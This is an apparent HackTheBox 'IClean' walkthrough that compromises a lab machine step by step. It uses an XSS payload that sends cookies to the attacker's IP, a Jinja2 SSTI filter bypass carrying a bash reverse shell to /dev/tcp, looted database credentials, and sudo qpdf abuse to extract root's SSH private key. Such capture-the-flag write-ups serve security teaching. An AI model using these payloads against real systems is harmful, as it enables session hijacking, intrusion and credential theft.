# IClean HackTheBox WalkThrough

![card](../../img/IClean/IClean.png)

We start the machine by running a scan of the full range of TCP ports.
```
nmap -p- -sS -n -Pn --min-rate 5000 10.129.189.64

Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 20:22 CEST
Nmap scan report for 10.129.189.64
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.26 seconds 
```

We can see that ports 22 and 80 are open, typically corresponding to SSH and HTTP services. Let's confirm this with a detailed scan of both ports.

```
nmap -p 22,80 -sVC --min-rate 5000 10.129.189.64

Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 20:27 CEST
Nmap scan report for 10.129.189.64
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2cf90777e3f13a36dbf23b94e3b7cfb2 (ECDSA)
|_  256 4a919ff274c04181524df1ff2d01786b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

On port 80, it indicates that we are dealing with a Linux machine (Ubuntu) running an Apache server, which might be useful later.

Since HTTP service is running on port 80, let's run the `whatweb` script to detect the technologies in use.

```
whatweb 10.129.189.64

http://10.129.189.64 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.189.64], Meta-Refresh-Redirect[http://capiclean.htb]
ERROR Opening: http://capiclean.htb - no address for capiclean.htb
```

It gives an error because it tries to redirect to the domain `http://capiclean.htb` but can't resolve it. To make our machine associate this domain with the IP `10.129.189.64`, we need to add the line `10.129.189.64 capiclean.htb` to the `/etc/hosts` file.

```
echo "10.129.189.64 capiclean.htb" >> /etc/hosts
```

After this, we can rerun the script.

```
whatweb 10.129.189.64

http://10.129.189.64 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.189.64], Meta-Refresh-Redirect[http://capiclean.htb]
http://capiclean.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], IP[10.129.189.64], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], Werkzeug[2.3.7], X-UA-Compatible[IE=edge]
```

Among other things, we discover that the site uses Python, information that could be crucial for code injection attacks.

Next, we will conduct a directory discovery using the `directory-list-2.3-medium.txt` dictionary from [SecLists](https://github.com/danielmiessler/SecLists).

```
wfuzz -c -u http://capiclean.htb/FUZZ -w ~delo/Hacking/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 -t 50

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://capiclean.htb/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000039:   200        87 L     159 W      2106 Ch     "login"
000000012:   200        129 L    355 W      5267 Ch     "about"
000000068:   200        192 L    579 W      8592 Ch     "services"
000000594:   200        182 L    564 W      8109 Ch     "team"
000000812:   200        89 L     181 W      2237 Ch     "quote"
000001211:   302        5 L      22 W       189 Ch      "logout"
000002913:   302        5 L      22 W       189 Ch      "dashboard"
000004613:   200        153 L    399 W      6084 Ch     "choose"

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 215.6359
Processed Requests: 65646
Filtered Requests: 65637
Requests/sec.: 304.4298
```

Out of these, the most interesting route seems to be `dashboard`, but upon accessing it, we are redirected to the root path, suggesting that we don't have the necessary permissions. Still, we'll note this route for the future.

With basic reconnaissance done, we can access the site through the browser and examine it thoroughly.

![web first impression](../../img/IClean/web.png)

Scrolling down, we see a `GET A QUOTE` button.

![get a quote button](../../img/IClean/get-a-quote-button.png)

Inside, we see a form. Let's fill it out to see how the site responds.

![quote form](../../img/IClean/quote-form.png)

When submitted, the site informs us that our request will be reviewed by a team, which raises our suspicion that it may be vulnerable to XSS.

![your quote request was sent to our management teem...](../../img/IClean/quote-thank-you.png)

To check for vulnerabilities, we'll intercept the request via BurpSuite and manipulate it in the repeater.

We see there's an email field and several service fields depending on the options we select. Let's try to insert a malicious HTML tag to attempt to steal the session cookies from the team reviewing the request.

![xss through burpsuite](../../img/IClean/xss-payload.png)

The payload shown above is the following, but to send it as a POST field, it must be URL-encoded. In BurpSuite, select the payload and press `ctrl`+`u`.

```html
<img src="err" onerror="fetch(`http://10.10.14.124:1234/?${document.cookie}`)" />
```

---

**What does this payload do?**

*Assuming that the `service` and `email` fields will be displayed to the reviewer in a browser, if they aren't properly sanitized, an HTML tag could be interpreted instead of being shown as plain text.*

*That's where our payload comes in. The browser will try to load an `<img />` tag with the URL "err," which will fail since there is no image called "err" in the current directory (hopefully).*

*Upon failure, the `onerror` of the tag will trigger, sending a GET request to our machine with the victim's cookies as parameters. We will then receive them and attempt to log in as that user.*

---

To capture the request being sent to port 1234, we use netcat.

```
nc -lnvtp 1234

listening on [any] 1234 ...
connect to [10.10.14.124] from (UNKNOWN) [10.129.189.64] 33942

GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zu26Vg.RFsVfRjFbg5CykH8zdKH9fGez7M HTTP/1.1
Host: 10.10.14.124:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

After waiting a few seconds, we receive the request with a session cookie `session`.

Now we can incorporate this cookie into our browser and attempt to access a path that was previously restricted, such as the `dashboard` we found earlier.

To do this, we open the developer panel with `F12`, go to the "Storage" tab in Firefox or "Application" in Chrome, open "Cookies," and add the cookie named `session`.

![save cookie](../../img/IClean/save-cookie.png)

With the new session cookie, we can now access the `dashboard`.

![dashboard](../../img/IClean/dasahboard.png)

Investigating all the links in the `dashboard`, we come across `Generate QR`, where we are asked for an invoice ID. To do this, we go to `Generate Invoice` and generate a test one.

![generate invoice](../../img/IClean/generate-invoice.png)

We copy the generated ID.

![invoice id](../../img/IClean/invoice-id.png)

We paste the ID into `Generate QR`.

![generate qr](../../img/IClean/genrate-qr.png)

And we paste the link of the newly generated QR.

![insert qr](../../img/IClean/insert-qr.png)

We see that an invoice has been generated with a QR code from the previous link.

![invoice](../../img/IClean/invoice.png)

It is very likely that our input will be introduced into a Jinja2 template or similar to create this invoice. This makes it potentially vulnerable to SSTI.

We are going to click `submit` again and intercept the request using Burp Suite. We will use the payload `qr_link={{11*11}}` to test if it is vulnerable.

---

**What is {{11*11}}?**

*Since we know that the page interprets Python, we can assume it uses a templating engine like Jinja2. This type of engine uses syntax like {{expression}} or similar to inject Python code into the HTML.*

*Thus, to verify that the content within the braces is being executed, if we put `{{11\*11}}`, it should output 121 in the HTML.*

---

![stti test](../../img/IClean/burpsuite-ssti-test.png)

If we search for the result (121) in the response, we see that it reflects in the `src` of the QR `img`. The `qr_link` field is vulnerable to SSTI.

![stti test response](../../img/IClean/stti-test-response.png)

o execute code through SSTI, we need to access the subclass "Popen". For this, we must know what subclass number it is. To see all subclasses, we need to execute `().__class__.__base__.__subclasses__()`. However, sending it triggers a `500 INTERNAL SERVER ERROR`. This may be due to the `_` being prohibited for security reasons.

![ssti error](../../img/IClean/ssti-error.png)

Searching Google for ways to bypass the filter on the `_`, we come across this article: [jinja2 ssti filter bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) where we find a way to execute it anyway.

The final post fields with the bypass look like this:

```
invoice_id=&form_type=scannable_invoice&class=__class__&base=__base__&subclasses=__subclasses__&qr_link={{()|attr(request.form.get('class'))|attr(request.form.get('base'))|attr(request.form.get('subclasses'))()}}
```

![subclasses-payload](../../img/IClean/subclasses-payload.png)

In the response, we copy all the subclasses (what's between brackets within the image src) and paste them into a file named `subclasses.txt`.

Once done, we execute the following script to find the position of `Popen` in the subclass list.

```
echo $(($(cat subclasses.txt | tr -d '[]' | tr ',' "\n" | grep -n Popen | awk '{ print $1 }' | tr -d ':') - 1))

365
```

Now that we know its number is `365`, we can execute commands with `().__class__.__base__.__subclasses__().__getitem__(365)('COMMAND',shell=True,stdout=-1).communicate()`.

Let's check if we have RCE by sending ourselves a reverse shell `bash -c "bash -i >& /dev/tcp/10.10.14.124/1234 0>&1"`, this with the bypass will look like this.

```
invoice_id=&form_type=scannable_invoice&class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__&qr_link={{(()|attr(request.form.get('class'))|attr(request.form.get('base'))|attr(request.form.get('subclasses'))()|attr(request.form.get('getitem'))(365)('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.124/1234+0>%261"',shell=True,stdout=-1)).communicate()}}
```

We listen with netcat to receive the reverse shell on port `1234`.

```
nc -lnvtp 1234
```

Once inside, we check what users have a terminal on the victim machine with the following command.

```
cat /etc/passwd | grep -e "sh$"

root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
```

We note down the name `consuela` in case it is useful in the future.

We see that we are in the `/opt/app` directory, where we find a file `app.py`. We will examine it for database credentials.

```
cat app.py

...contenido del archivo...
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
...contenido del archivo...
```

Let's connect to the database with these credentials.

```
mysql -h 127.0.0.1 -u iclean -D capiclean -p

Enter password: pxCsmnGLckUb
```

We display the tables.

```
show tables;

+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
```

We show all the contents of the `users` table in search of usernames and passwords that we can use to escalate privileges.

```
select * from users;

+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```

We realize there is a user named `consuela` with a hashed password. We can try to crack it with brute force or check if it has already been cracked previously on a platform like [crackstation](https://crackstation.net/).

![crackstation](../../img/IClean/crackstation-password.png)

Indeed, the password is listed in the Crackstation database. We can try logging in as `consuela` on the machine with the password we just retrieved.

```
su consuela

Password: simple and clean
```

The password is correct. Now as consuela, we have access to `user.txt`.

```
cd
cat user.txt
```

To try to escalate privileges, we start by checking which commands we can run as root using `sudo`.

```
sudo -l

Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

We can execute `qpdf` as root, so let's read the command help looking for an option that allows us to become root.

```
sudo qpdf --help

Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation
```

There is one option that particularly stands out to us: `add-attachment`. We can attach the SSH private key of the root user.

First, we need to investigate the help for the `add-attachment` parameter to use it correctly.

```
sudo qpdf --help=add-attachment

The options listed below appear between --add-attachment and its
terminating "--".

Related options:
  --creationdate: set attachment's creation date
  --description: set attachment's description
  --filename: set attachment's displayed filename
  --key: specify attachment key
  --mimetype: attachment mime type, e.g. application/pdf
  --moddate: set attachment's modification date
  --replace: replace attachment with same key

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

To start, we will download a test PDF to our local machine and start a server in Python to transfer it to the victim machine.

```
wget https://pdfobject.com/pdf/sample.pdf
python3 -m http.server 80
```

On the victim machine, we download this PDF to a folder in `/tmp`.

```
mkdir /tmp/.delo
cd !$
wget http://10.10.14.124/sample.pdf
```

Now we can attach the file `/root/.ssh/id_rsa` to the PDF.

```
sudo qpdf sample.pdf --add-attachment /root/.ssh/id_rsa -- root-id_rsa.pdf
```

We now have the file `root-id_rsa.pdf`, we just need to find a way to read it and use it to authenticate as root.

```
sudo qpdf --help=attachments

It is possible to list, add, or delete embedded files (also known
as attachments) and to copy attachments from other files. See help
on individual options for details. Run qpdf --help=add-attachment
for additional details about adding attachments. See also
--help=--list-attachments and --help=--show-attachment.

Related options:
  --add-attachment: start add attachment options
  --copy-attachments-from: start copy attachment options
  --remove-attachment: remove an embedded file

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

We delve into the help for the `--show-attachment` parameter.

```
sudo qpdf --help=--show-attachment

--show-attachment=key

Write the contents of the specified attachment to standard
output as binary data. Get the key with --list-attachments.

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

We list the `keys` of the attachments and discover that it is just the name of the attached file.

```
sudo qpdf --list-attachments root-id_rsa.pdf

id_rsa -> 7,0
```

```
sudo qpdf --show-attachment=id_rsa root-id_rsa.pdf

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

We add this private key to a file on our local machine named `root-id_rsa`, give it the proper permissions to use it as an identity file, and connect to the machine via SSH as root.

```
nano root-id_rsa
chmod 600 root-id_rsa
ssh root@10.129.189.64 -i root-id_rsa
```

The authentication is successful; we just need to read `root.txt`, and we will have completed the machine.

```
cd
cat root.txt
```

After finishing the machine, don’t forget to remove the line from `/etc/hosts` corresponding to the machine to avoid accumulating lines with each machine you do.

If you found this useful, consider giving a star to the project. Thank you, and good luck with your future machines ❤️.